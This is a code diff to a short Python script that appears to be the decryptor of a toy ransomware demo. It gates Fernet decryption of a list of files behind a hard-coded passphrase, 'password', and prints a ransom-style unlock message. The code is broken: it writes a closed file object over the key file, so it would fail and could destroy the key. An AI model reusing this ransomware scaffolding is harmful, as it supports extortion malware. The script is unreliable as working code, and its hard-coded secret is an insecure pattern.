@@ -18,13 +18,18 @@ print(files)
 with open("thekey.key","rb") as key:
     secretkey = key.read()
 
-# create the key file as a write binary
-with open("thekey.key", "wb") as thekey:
-    thekey.write(key)
+secretphrace = "password"
+user_phrace = input("Enter your secret phrace\n")
 
-for file in files:
-    with open(file,"rb") as thefile:
-        contents = thefile.read()
-    contents_decrypted = Fernet(secretkey).decrypt(contents)
-    with open(file,"wb") as thefile:
-        thefile.write(contents_decrypted)
+if secretphrace == user_phrace:
+    # create the key file as a write binary
+    with open("thekey.key", "wb") as thekey:
+        thekey.write(key)
+
+    for file in files:
+        with open(file,"rb") as thefile:
+            contents = thefile.read()
+        contents_decrypted = Fernet(secretkey).decrypt(contents)
+        with open(file,"wb") as thefile:
+            thefile.write(contents_decrypted)
+        print("Your all files has been decrypted.")
